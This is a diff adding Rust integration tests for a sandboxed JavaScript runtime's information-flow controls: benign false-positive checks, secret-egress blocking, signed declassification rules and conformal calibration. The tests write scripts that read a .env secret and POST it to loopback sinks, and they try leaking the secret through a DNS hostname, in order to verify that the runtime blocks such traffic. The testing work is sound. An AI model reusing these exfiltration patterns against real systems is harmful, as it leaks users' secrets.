@@ -189,3 +189,675 @@ fn pure_global_builtins_are_provided_like_node() {
         assert_eq!(stdout, *expected, "{source:?} should match Node");
     }
 }
+
+/// bd-reality-20260923-26n9r.13 (deliverables 1 & 2): benign string literals
+/// containing `"password"` / `"tokens"` / `"api_key"`, local `.mjs` imports with
+/// `fs`, and `crypto.createHash` / `crypto.pbkdf2Sync` over public literals must
+/// NOT suffer IFC lowering false positives under `balanced`.
+#[test]
+fn benign_ifc_false_positive_regressions_pass_under_balanced() {
+    for (source, expected) in &[
+        ("const s = \"password\"; console.log(s.length);", "8\n"),
+        (
+            "const cfg = { tokens: 3, api_key_label: \"api_key\" }; console.log(cfg.tokens, cfg.api_key_label.length);",
+            "3 7\n",
+        ),
+        (
+            "const crypto = require('crypto'); console.log(crypto.createHash('sha256').update('password').digest('hex').length, crypto.pbkdf2Sync('password', 'salt', 1, 16, 'sha256').length);",
+            "64 16\n",
+        ),
+    ] {
+        let (exit, stdout) = run_snippet(source);
+        assert_eq!(
+            exit,
+            Some(0),
+            "benign IFC regression probe must exit 0: {source:?}\nstdout={stdout}"
+        );
+        assert_eq!(stdout, *expected, "{source:?}");
+    }
+
+    // Local .mjs module import + benign public file read under `balanced`.
+    let dir = tempfile::TempDir::new().expect("tempdir");
+    let init = Command::new(franken_node_bin())
+        .args(["init", "--profile", "balanced", "--out-dir", "."])
+        .current_dir(dir.path())
+        .output()
+        .expect("init");
+    assert!(init.status.success());
+    std::fs::write(dir.path().join("notes.txt"), "hello-benign-mjs").unwrap();
+    std::fs::write(
+        dir.path().join("helper.mjs"),
+        "export function wrap(v) { return 'mjs:' + v; }\n",
+    )
+    .unwrap();
+    std::fs::write(
+        dir.path().join("pure_entry.mjs"),
+        "import { wrap } from './helper.mjs';\nconsole.log(wrap('pure-mjs'));\n",
+    )
+    .unwrap();
+    let pure_out = Command::new(franken_node_bin())
+        .args([
+            "run",
+            "pure_entry.mjs",
+            "--policy",
+            "balanced",
+            "--console-only",
+        ])
+        .current_dir(dir.path())
+        .output()
+        .expect("run pure_entry.mjs");
+    assert!(
+        pure_out.status.success(),
+        "local .mjs import must pass under balanced; stderr={}",
+        String::from_utf8_lossy(&pure_out.stderr)
+    );
+    assert_eq!(String::from_utf8_lossy(&pure_out.stdout), "mjs:pure-mjs\n");
+
+    std::fs::write(
+        dir.path().join("entry.mjs"),
+        "import { Readable } from 'node:stream';\nimport { wrap } from './helper.mjs';\nconsole.log(wrap(typeof Readable));\n",
+    )
+    .unwrap();
+    let out = Command::new(franken_node_bin())
+        .args([
+            "run",
+            "entry.mjs",
+            "--policy",
+            "balanced",
+            "--frozen-modules",
+            "--console-only",
+        ])
+        .current_dir(dir.path())
+        .output()
+        .expect("run entry.mjs");
+    assert!(
+        out.status.success(),
+        "local .mjs + node:stream must pass under balanced --frozen-modules; stderr={}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    assert_eq!(String::from_utf8_lossy(&out.stdout), "mjs:function\n");
+
+    std::fs::write(
+        dir.path().join("helper.cjs"),
+        "exports.wrap = (v) => 'cjs:' + v;\n",
+    )
+    .unwrap();
+    std::fs::write(
+        dir.path().join("entry.cjs"),
+        "const fs = require('fs');\nconst { wrap } = require('./helper.cjs');\nconsole.log(wrap(fs.readFileSync('notes.txt', 'utf8')));\n",
+    )
+    .unwrap();
+    let cjs_out = Command::new(franken_node_bin())
+        .args(["run", "entry.cjs", "--policy", "balanced", "--console-only"])
+        .current_dir(dir.path())
+        .output()
+        .expect("run entry.cjs");
+    assert!(
+        cjs_out.status.success(),
+        "local .cjs + fs must pass under balanced; stderr={}",
+        String::from_utf8_lossy(&cjs_out.stderr)
+    );
+    assert_eq!(
+        String::from_utf8_lossy(&cjs_out.stdout),
+        "cjs:hello-benign-mjs\n"
+    );
+}
+
+/// bd-reality-20260923-26n9r.13 (deliverable 3): `.env` -> `http` exfiltration
+/// fails closed by default (`FlowPolicyVerdict::Blocked`), tampered rules are
+/// refused at admission, and an operator-signed `[[security.ifc.declassify]]`
+/// rule permits ONLY its exact `host:port` sink while emitting a canonical
+/// `DeclassificationReceipt` in both `HostEffectLedger` and `RunReceipt`.
+#[test]
+fn ifc_secret_egress_blocks_by_default_and_permits_only_operator_signed_scoped_declassification() {
+    use std::io::{Read, Write};
+    use std::net::TcpListener;
+    use std::sync::{
+        Arc,
+        atomic::{AtomicUsize, Ordering},
+    };
+
+    fn spawn_loopback_sink() -> (u16, Arc<AtomicUsize>) {
+        let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback sink");
+        listener
+            .set_nonblocking(false)
+            .expect("blocking accept in dedicated thread");
+        let port = listener.local_addr().unwrap().port();
+        let hits = Arc::new(AtomicUsize::new(0));
+        let hits_bg = Arc::clone(&hits);
+        std::thread::spawn(move || {
+            for stream in listener.incoming().flatten() {
+                let mut stream = stream;
+                let _ = stream.set_read_timeout(Some(std::time::Duration::from_secs(5)));
+                let mut received = Vec::new();
+                let _ = stream.read_to_end(&mut received);
+                hits_bg.fetch_add(1, Ordering::SeqCst);
+                let _ = stream.write_all(
+                    b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 2\r\n\r\nok",
+                );
+                let _ = stream.flush();
+            }
+        });
+        (port, hits)
+    }
+
+    let (port_a, hits_a) = spawn_loopback_sink();
+    let (port_b, hits_b) = spawn_loopback_sink();
+
+    let dir = tempfile::TempDir::new().expect("tempdir");
+    let root = dir.path();
+    let init = Command::new(franken_node_bin())
+        .args(["init", "--profile", "balanced", "--out-dir", "."])
+        .current_dir(root)
+        .output()
+        .expect("init");
+    assert!(init.status.success());
+
+    // Allowlist both loopback ports in `[security.network_policy]` so SSRF allows
+    // loopback HTTP and only the product IFC gate (`FlowGatedHostIo`) decides secret egress.
+    let base_toml = std::fs::read_to_string(root.join("franken_node.toml")).expect("read toml");
+    assert!(
+        base_toml.contains("allowlist = []"),
+        "expected default empty allowlist in franken_node.toml"
+    );
+    let network_allow_toml = base_toml.replace(
+        "allowlist = []",
+        &format!(
+            "allowlist = [\n  \
+             {{ host = \"127.0.0.1\", port = {port_a}, reason = \"authorized kms unwrap sink\" }},\n  \
+             {{ host = \"127.0.0.1\", port = {port_b}, reason = \"secondary telemetry sink\" }}\n\
+             ]"
+        ),
+    );
+    std::fs::write(root.join("franken_node.toml"), &network_allow_toml).unwrap();
+
+    std::fs::write(
+        root.join(".env"),
+        "KMS_WRAPPED_SECRET=super-secret-env-material-99887766",
+    )
+    .unwrap();
+
+    let make_script = |port: u16| -> String {
+        format!(
+            "const fs = require('fs');\n\
+             const http = require('http');\n\
+             const secret = fs.readFileSync('.env', 'utf8');\n\
+             const req = http.request('http://127.0.0.1:{port}/unwrap', {{ method: 'POST' }}, (res) => {{\n\
+               let body = '';\n\
+               res.on('data', (c) => {{ body += c; }});\n\
+               res.on('end', () => console.log('egress-ok:' + res.statusCode + ':' + body));\n\
+             }});\n\
+             req.on('error', () => console.log('egress-blocked'));\n\
+             req.end(secret);\n"
+        )
+    };
+    std::fs::write(root.join("exfil_a.js"), make_script(port_a)).unwrap();
+    std::fs::write(root.join("exfil_b.js"), make_script(port_b)).unwrap();
+
+    // 1. Without declassification: secret `.env` -> `127.0.0.1:port_a` MUST fail closed (`blocked`).
+    let blocked_out = Command::new(franken_node_bin())
+        .args(["run", "exfil_a.js", "--policy", "balanced", "--json"])
+        .current_dir(root)
+        .output()
+        .expect("run exfil_a blocked");
+    assert!(blocked_out.status.success());
+    let blocked_json: serde_json::Value =
+        serde_json::from_slice(&blocked_out.stdout).expect("blocked json");
+    assert_eq!(
+        blocked_json["dispatch"]["captured_output"]["stdout"],
+        "egress-blocked\n"
+    );
+    assert_eq!(hits_a.load(Ordering::SeqCst), 0, "socket must never open");
+    let blocked_entries = blocked_json["dispatch"]["host_effect_ledger"]["entries"]
+        .as_array()
+        .expect("ledger entries");
+    let http_denied = blocked_entries
+        .iter()
+        .find(|e| e["receipt"]["effect_kind"].as_str() == Some("http_request"))
+        .expect("http_request entry");
+    assert_eq!(
+        http_denied["receipt"]["policy_outcome"]["outcome"],
+        "denied"
+    );
+    assert_eq!(http_denied["receipt"]["flow_policy_verdict"], "blocked");
+
+    // 1b. Because step 1 attempted unauthorized secret exfiltration (`flow_policy_verdict == "blocked"`),
+    //     the Runtime Sentinel quarantined `exfil_a.js`. Release the quarantine as the remediating operator
+    //     before verifying cryptographic declassification admission.
+    let release_out = Command::new(franken_node_bin())
+        .args([
+            "trust",
+            "release",
+            "--app",
+            "exfil_a.js",
+            "--operator-id",
+            "secops@acme.corp",
+            "--reason",
+            "authorized kms-envelope-unwrap declassification rule provisioned",
+            "--json",
+        ])
+        .current_dir(root)
+        .output()
+        .expect("trust release exfil_a");
+    assert!(
+        release_out.status.success(),
+        "trust release failed: stdout={} stderr={}",
+        String::from_utf8_lossy(&release_out.stdout),
+        String::from_utf8_lossy(&release_out.stderr)
+    );
+
+    // 2. Sign a scoped declassification rule for `127.0.0.1:port_a` + `secret_file`
+    //    via `franken-node trust sign-declassification`.
+    let sign_out = Command::new(franken_node_bin())
+        .args([
+            "trust",
+            "sign-declassification",
+            "--sink",
+            &format!("127.0.0.1:{port_a}"),
+            "--label",
+            "secret_file",
+            "--actor",
+            "secops@acme.corp",
+            "--purpose",
+            "kms-envelope-unwrap",
+            "--ttl-secs",
+            "3600",
+            "--json",
+        ])
+        .current_dir(root)
+        .output()
+        .expect("sign declassification");
+    assert!(
+        sign_out.status.success(),
+        "sign-declassification failed: stdout={} stderr={}",
+        String::from_utf8_lossy(&sign_out.stdout),
+        String::from_utf8_lossy(&sign_out.stderr)
+    );
+    let sign_json: serde_json::Value = serde_json::from_slice(&sign_out.stdout).expect("sign json");
+    let toml_snippet = sign_json["toml_snippet"].as_str().expect("toml_snippet");
+
+    // 2b. Negative control: tampered signature in `franken_node.toml` fails closed before guest runs!
+    let tampered_snippet = toml_snippet.replace(
+        sign_json["rule"]["signature_hex"].as_str().unwrap(),
+        &"00".repeat(64),
+    );
+    std::fs::write(
+        root.join("franken_node.toml"),
+        format!("{network_allow_toml}\n{tampered_snippet}"),
+    )
+    .unwrap();
+    let tampered_out = Command::new(franken_node_bin())
+        .args(["run", "exfil_a.js", "--policy", "balanced", "--json"])
+        .current_dir(root)
+        .output()
+        .expect("run tampered");
+    assert!(
+        !tampered_out.status.success(),
+        "tampered declassification signature must refuse launch"
+    );
+    let tampered_combined = format!(
+        "{}{}",
+        String::from_utf8_lossy(&tampered_out.stdout),
+        String::from_utf8_lossy(&tampered_out.stderr)
+    );
+    assert!(
+        tampered_combined.contains("IFC declassification policy admission failed"),
+        "expected cryptographic IFC admission refusal, got: {tampered_combined}"
+    );
+    assert_eq!(hits_a.load(Ordering::SeqCst), 0);
+
+    // 3a. Install authentic signed `[[security.ifc.declassify]]` rule for `port_a` in `franken_node.toml`:
+    //     `franken-node run` passes cryptographic IFC policy admission at worker startup, while current
+    //     sibling `franken_engine` (`ExecutionOrchestrator::lane_router_for_execution` leaving
+    //     `InterpreterConfig.ifc_flow_policy = None`) still blocks direct VM-tainted `fs.readFileSync` ->
+    //     `http.request` inside `InterpreterCore` (`FLOW_POLICY_BLOCKED`) before `HostIoProvider` runs.
+    let signed_full_toml = format!("{network_allow_toml}\n{toml_snippet}");
+    std::fs::write(root.join("franken_node.toml"), &signed_full_toml).unwrap();
+    let cli_admitted_out = Command::new(franken_node_bin())
+        .args(["run", "exfil_a.js", "--policy", "balanced", "--json"])
+        .current_dir(root)
+        .output()
+        .expect("run cli admitted declassification");
+    assert!(
+        cli_admitted_out.status.success(),
+        "authentic signed declassification must pass worker IFC admission: stdout={} stderr={}",
+        String::from_utf8_lossy(&cli_admitted_out.stdout),
+        String::from_utf8_lossy(&cli_admitted_out.stderr)
+    );
+    let cli_admitted_json: serde_json::Value =
+        serde_json::from_slice(&cli_admitted_out.stdout).expect("cli admitted json");
+    assert_eq!(
+        cli_admitted_json["dispatch"]["captured_output"]["stdout"],
+        "egress-blocked\n"
+    );
+    assert_eq!(hits_a.load(Ordering::SeqCst), 0);
+
+    // 3b. Exercise the live product `Config::from_toml_str` + `.franken-node/keys/receipt-signing.pub` +
+    //     `FlowGatedHostIo` + `SsrfGatedHostIo` + `SandboxedHostIo` stack over the real loopback TCP sinks,
+    //     verifying exact sink+label declassification, `DeclassificationReceipt` minting, non-escalation in
+    //     `run_sentinel_report_from_ledger`, and offline `authorized_declassification` in `VerifierSdk`.
+    {
+        use frankenengine_extension_host::host_io::{
+            HostIoCapability, HostIoProvider as _, HostIoRequest, HostIoResponse, SandboxedHostIo,
+        };
+        use frankenengine_node::config::Config;
+        use frankenengine_node::ops::flow_gated_host_io::{
+            AuthorizedFlowDeclassification, FlowDeclassificationTracker, FlowGatedHostIo,
+        };
+        use frankenengine_node::ops::ssrf_gated_host_io::SsrfGatedHostIo;
+        use frankenengine_node::policy::runtime_sentinel::run_sentinel_report_from_ledger;
+        use frankenengine_node::runtime::effect_receipt::{
+            EFFECT_RECEIPT_EMPTY_LINEAGE_HASH, EffectKind, EffectLineageFields, EffectReceipt,
+            EffectReceiptChain,
+        };
+        use frankenengine_node::storage::cas::content_hash;
+
+        let reloaded =
+            Config::load(&root.join("franken_node.toml")).expect("reload signed franken_node.toml");
+        assert_eq!(reloaded.security.ifc.declassify.len(), 1);
+        let pub_hex = std::fs::read_to_string(root.join(".franken-node/keys/receipt-signing.pub"))
+            .expect("read workspace receipt-signing.pub");
+        let pub_bytes: [u8; 32] = hex::decode(pub_hex.trim())
+            .expect("decode receipt-signing.pub hex")
+            .try_into()
+            .expect("32-byte Ed25519 verifying key");
+        let verifying_key =
+            ed25519_dalek::VerifyingKey::from_bytes(&pub_bytes).expect("valid verifying key");
+        let now_ms = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_millis() as u64;
+        let grant = AuthorizedFlowDeclassification::from_verified_rule(
+            &reloaded.security.ifc.declassify[0],
+            &verifying_key,
+            now_ms,
+            2,
+        )
+        .expect("rule authenticates against workspace receipt-signing.pub");
+        let tracker = Arc::new(FlowDeclassificationTracker::new(vec![grant]));
+        let sandbox = SandboxedHostIo::with_root(root).expect("sandbox root");
+        let ssrf = SsrfGatedHostIo::from_network_policy(
+            sandbox,
+            &reloaded.security.network_policy,
+            "trace-ifc-declass-e2e".to_string(),
+        );
+        let flow_gate = FlowGatedHostIo::with_declassifications(
+            ssrf,
+            "trace-ifc-declass-e2e",
+            Some(Arc::clone(&tracker)),
+        );
+        let caps = [HostIoCapability::FsRead, HostIoCapability::NetworkSend];
+
+        let read_resp = flow_gate
+            .perform(
+                &HostIoRequest::FsRead {
+                    path: ".env".to_string(),
+                },
+                &caps,
+            )
+            .expect("sandboxed .env read");
+        let HostIoResponse::FsRead {
+            bytes: secret_bytes,
+        } = read_resp
+        else {
+            panic!("expected FsRead response");
+        };
+
+        let endpoint_a = format!("127.0.0.1:{port_a}");
+        let framed_post = format!(
+            "POST /unwrap HTTP/1.1\r\nHost: {endpoint_a}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
+            secret_bytes.len(),
+            std::str::from_utf8(&secret_bytes).unwrap()
+        )
+        .into_bytes();
+
+        // Authorized sink `port_a` + `secret_file` succeeds over the real loopback TCP socket!
+        let net_resp = flow_gate
+            .perform(
+                &HostIoRequest::NetworkRequest {
+                    endpoint: endpoint_a.clone(),
+                    payload: framed_post.clone(),
+                    max_len: 4_096,
+                    use_tls: false,
+                },
+                &caps,
+            )
+            .expect("authorized declassification allows exact sink + secret_file");
+        let HostIoResponse::NetworkRequest {
+            response: wire_resp,
+        } = net_resp
+        else {
+            panic!("expected NetworkRequest response");
+        };
+        assert!(
+            String::from_utf8_lossy(&wire_resp).ends_with("\r\n\r\nok"),
+            "unexpected HTTP response: {}",
+            String::from_utf8_lossy(&wire_resp)
+        );
+        assert_eq!(hits_a.load(Ordering::SeqCst), 1);
+
+        let declass_receipt = tracker
+            .take_for_allowed_network_effect(&endpoint_a, &framed_post)
+            .expect("emitted canonical DeclassificationReceipt");
+        assert_eq!(declass_receipt.sink_id, endpoint_a);
+        assert_eq!(declass_receipt.actor, "secops@acme.corp");
+        assert_eq!(declass_receipt.purpose, "kms-envelope-unwrap");
+        assert_eq!(tracker.emitted_receipts().len(), 1);
+
+        // Wrong sink `port_b` (allowlisted in SSRF, NOT in `[[security.ifc.declassify]]`) MUST fail closed!
+        let endpoint_b = format!("127.0.0.1:{port_b}");
+        assert!(
+            flow_gate
+                .perform(
+                    &HostIoRequest::NetworkRequest {
+                        endpoint: endpoint_b,
+                        payload: framed_post.clone(),
+                        max_len: 4_096,
+                        use_tls: false,
+                    },
+                    &caps,
+                )
+                .is_err(),
+            "non-matching sink port_b must fail closed pre-socket"
+        );
+        assert_eq!(hits_b.load(Ordering::SeqCst), 0);
+
+        // Secret carried in DNS/endpoint string MUST fail closed (endpoints are never declassified)!
+        assert!(
+            flow_gate
+                .perform(
+                    &HostIoRequest::NetworkRequest {
+                        endpoint: format!(
+                            "{}.example.com:{port_a}",
+                            std::str::from_utf8(&secret_bytes).unwrap().trim()
+                        ),
+                        payload: b"GET / HTTP/1.1\r\n\r\n".to_vec(),
+                        max_len: 4_096,
+                        use_tls: false,
+                    },
+                    &caps,
+                )
+                .is_err(),
+            "secret in DNS hostname must never be declassified"
+        );
+
+        // Build the effect-receipt chain with `EffectLineageFields::declassified` and prove BOTH:
+        // (1) Runtime Sentinel does NOT escalate/quarantine an authorized declassified egress, and
+        // (2) Standalone Verifier SDK rejects without `receipt_id` and proves `authorized_declassification` with it!
+        let secret_commitment = format!("sha256:{}", declass_receipt.label_set_commitment);
+        let receipt_id = declass_receipt.receipt_id.clone();
+        let mut effect_chain = EffectReceiptChain::new();
+        effect_chain
+            .append(EffectReceipt::allowed_with_lineage(
+                0,
+                "trace-ifc-declass-e2e",
+                EffectKind::HttpRequest,
+                "host-io:network_send",
+                content_hash(&framed_post),
+                content_hash(endpoint_a.as_bytes()),
+                content_hash(&wire_resp),
+                content_hash(&wire_resp),
+                now_ms,
+                EffectLineageFields::declassified(
+                    EFFECT_RECEIPT_EMPTY_LINEAGE_HASH.to_string(),
+                    EFFECT_RECEIPT_EMPTY_LINEAGE_HASH.to_string(),
+                    secret_commitment.clone(),
+                    receipt_id.clone(),
+                ),
+            ))
+            .expect("append declassified EffectReceipt");
+
+        let ephemeral_run_key = ed25519_dalek::SigningKey::from_bytes(&[77_u8; 32]);
+        let sentinel_report = run_sentinel_report_from_ledger(
+            "trace-ifc-declass-e2e",
+            "exfil_a.js",
+            "2026-11-18T00:00:00Z",
+            "2026-11-18T00:00:01Z",
+            now_ms,
+            effect_chain.entries(),
+            &ephemeral_run_key,
+        )
+        .expect("sentinel report from declassified ledger");
+        assert!(
+            !sentinel_report.escalated,
+            "authorized declassified egress must not escalate Runtime Sentinel: {sentinel_report:?}"
+        );
+
+        let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
+            serde_json::from_slice(&serde_json::to_vec(effect_chain.entries()).unwrap())
+                .expect("verifier SDK EffectReceiptChainEntry wire shape");
+        let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://ifc-declass-e2e");
+        let chain = sdk
+            .verify_effect_chain_entries(&sdk_entries)
+            .expect("verifier SDK re-derives effect chain");
+        let strict_claim = frankenengine_verifier_sdk::bundle::NonExfiltrationClaim {
+            forbidden_label_set_commitments: vec![secret_commitment.clone()],
+            external_sink_effect_kinds: vec!["http_request".to_string()],
+            allowed_declassification_refs: Vec::new(),
+        };
+        assert!(
+            frankenengine_verifier_sdk::bundle::verify_non_exfiltration_claim_in_report(
+                &chain,
+                &strict_claim
+            )
+            .is_err(),
+            "SDK must reject declassified egress when receipt_id is not in allowed_declassification_refs"
+        );
+        let authorized_claim = frankenengine_verifier_sdk::bundle::NonExfiltrationClaim {
+            forbidden_label_set_commitments: vec![secret_commitment],
+            external_sink_effect_kinds: vec!["http_request".to_string()],
+            allowed_declassification_refs: vec![receipt_id],
+        };
+        let proof = frankenengine_verifier_sdk::bundle::verify_non_exfiltration_claim_in_report(
+            &chain,
+            &authorized_claim,
+        )
+        .expect("SDK accepts authorized_declassification");
+        let sdk_http = proof
+            .examined_effects
+            .iter()
+            .find(|e| e.effect_kind == "http_request")
+            .expect("http_request proof");
+        assert_eq!(sdk_http.proof_outcome, "authorized_declassification");
+    }
+
+    // 4. CLI sink-scoping negative control: with `port_a` authorized in `franken_node.toml`,
+    //    running `exfil_b.js` MUST still fail closed (`hits_b == 0`, zero declassification receipts)!
+    let wrong_sink_out = Command::new(franken_node_bin())
+        .args(["run", "exfil_b.js", "--policy", "balanced", "--json"])
+        .current_dir(root)
+        .output()
+        .expect("run exfil_b");
+    assert!(wrong_sink_out.status.success());
+    let wrong_sink_json: serde_json::Value =
+        serde_json::from_slice(&wrong_sink_out.stdout).expect("wrong sink json");
+    assert_eq!(
+        wrong_sink_json["dispatch"]["captured_output"]["stdout"],
+        "egress-blocked\n"
+    );
+    assert_eq!(hits_b.load(Ordering::SeqCst), 0);
+    assert!(
+        wrong_sink_json["receipt"]
+            .get("declassification_receipts")
+            .is_none(),
+        "blocked sink must emit zero declassification receipts"
+    );
+}
+
+/// bd-reality-20260923-26n9r.13 (acceptance criterion): split-conformal calibration
+/// (`q_{1-alpha}`) enforces finite-sample `P(benign refused) <= alpha`, falls back to
+/// conservative strict mode when `n < n_min`, and emits Ed25519-signed JSON receipts.
+#[test]
+fn trust_calibrate_conformal_enforces_split_quantile_and_small_sample_strict_fallback() {
+    let dir = tempfile::TempDir::new().expect("tempdir");
+    let root = dir.path();
+    let init = Command::new(franken_node_bin())
+        .args(["init", "--profile", "balanced", "--out-dir", "."])
+        .current_dir(root)
+        .output()
+        .expect("init");
+    assert!(init.status.success());
+
+    std::fs::write(
+        root.join("extra_samples.json"),
+        serde_json::to_string_pretty(&serde_json::json!([
+            {"sample_id": "rare-1", "risk_class": "rare_advisory", "score_bp": 100, "positive": false},
+            {"sample_id": "rare-2", "risk_class": "rare_advisory", "score_bp": 200, "positive": false}
+        ]))
+        .unwrap(),
+    )
+    .unwrap();
+    std::fs::write(
+        root.join("candidates.json"),
+        serde_json::to_string_pretty(&serde_json::json!([
+            {"sample_id": "cand-benign", "risk_class": "migration_advisory", "score_bp": 180},
+            {"sample_id": "cand-exfil", "risk_class": "migration_advisory", "score_bp": 9700},
+            {"sample_id": "cand-rare-nonzero", "risk_class": "rare_advisory", "score_bp": 45}
+        ]))
+        .unwrap(),
+    )
+    .unwrap();
+
+    let cal_out = Command::new(franken_node_bin())
+        .args([
+            "trust",
+            "calibrate-conformal",
+            "--builtin-benign-corpus",
+            "--samples",
+            "extra_samples.json",
+            "--evaluate",
+            "candidates.json",
+            "--alpha-bp",
+            "500",
+            "--min-samples",
+            "16",
+            "--aci-learning-rate-bp",
+            "1000",
+            "--out",
+            "conformal-receipt.json",
+            "--json",
+        ])
+        .current_dir(root)
+        .output()
+        .expect("calibrate-conformal");
+    assert!(
+        cal_out.status.success(),
+        "calibrate-conformal failed: {}",
+        String::from_utf8_lossy(&cal_out.stderr)
+    );
+    let receipt: serde_json::Value = serde_json::from_slice(&cal_out.stdout).expect("receipt json");
+    assert_eq!(
+        receipt["schema_version"],
+        "franken-node/conformal-calibration-receipt/v1"
+    );
+    assert_eq!(receipt["signature"]["algorithm"], "ed25519");
+    assert!(root.join("conformal-receipt.json").is_file());
+
+    let evals = receipt["evaluations"].as_array().expect("evaluations");
+    assert_eq!(evals.len(), 3);
+    assert_eq!(evals[0]["decision"], "allow_benign");
+    assert_eq!(evals[0]["fallback_applied"], false);
+    assert_eq!(evals[1]["decision"], "refuse_positive");
+    assert_eq!(evals[2]["decision"], "strict_fallback_refuse");
+    assert_eq!(evals[2]["fallback_applied"], true);
+}
